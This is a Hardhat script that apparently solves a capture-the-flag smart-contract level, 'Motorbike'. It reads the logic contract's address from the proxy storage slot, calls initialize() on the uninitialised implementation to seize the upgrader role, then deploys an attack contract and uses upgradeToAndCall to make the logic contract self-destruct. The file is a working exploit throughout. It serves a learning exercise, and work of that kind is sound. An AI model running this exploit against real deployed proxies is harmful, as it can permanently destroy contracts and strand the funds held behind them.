const hre = require("hardhat");
const delegateABI = require("../artifacts/contracts/Challenge 25/Motorbike.sol/Engine.json"); // get ABI from logic contract
const delegateABI2 = require("../artifacts/contracts/Challenge 25/MotorbikeAttack.sol/MotorbikeAttack.json"); // get ABI from new logic contract

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("Motorbike");
  const victim = await Victim.attach(
    "0xE1c733599417b352C4363b39A60558232123ec69" // This is the contract address that you get from starting your instance
  );

  // First we need to get the address of engine
  const [owner, addr1] = await ethers.getSigners(); // get your account
  const implAddr = await owner.provider.getStorageAt(
    victim.address,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc" // the address of the logic contract is always in this position
  );

  const implAddr1 = "0x" + implAddr.slice(-40); // cut the first 0's

  // Get the address
  console.log("The address of the logic contract is ", implAddr1);

  // Now we will call the initialize function to become the upgraders and upgrade to a malicious address
  // We have to do via encodeFunctionData because we are interacting with the proxy contract
  const delgateInterface = new ethers.utils.Interface(delegateABI.abi);
  const data1 = delgateInterface.encodeFunctionData(`initialize`, []);
  const attack1 = await owner.sendTransaction({
    to: implAddr1,
    data: data1, // we pass in the data variable obtained above
    gasLimit: 100000, // to not get error gas
  });

  await attack1.wait(1);

  // We can verify that we are the upgraders
  const data2 = delgateInterface.encodeFunctionData(`upgrader`, []);
  const value = await owner.sendTransaction({
    to: implAddr1,
    data: data2, // we pass in the data variable obtained above
    gasLimit: 100000, // to not get error gas
  });

  // Get the address
  console.log("The address of the upgrader is ", value.from);

  // Now we deploy the attack contract
  const MyContract = await ethers.getContractFactory("MotorbikeAttack");

  // Deploy contract
  const contract = await MyContract.deploy();
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // We upgrade to the attack contract and call the malicious function
  const delgateInterface2 = new ethers.utils.Interface(delegateABI2.abi);
  const data3 = delgateInterface2.encodeFunctionData(`attack`, []);
  const data4 = delgateInterface.encodeFunctionData(`upgradeToAndCall`, [
    contract.address,
    data3,
  ]);
  const attack2 = await owner.sendTransaction({
    to: implAddr1,
    data: data4, // we pass in the data variable obtained above
    gasLimit: 100000, // to not get error gas
  });

  await attack2.wait(1);

  console.log("The contract has self destructed");
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
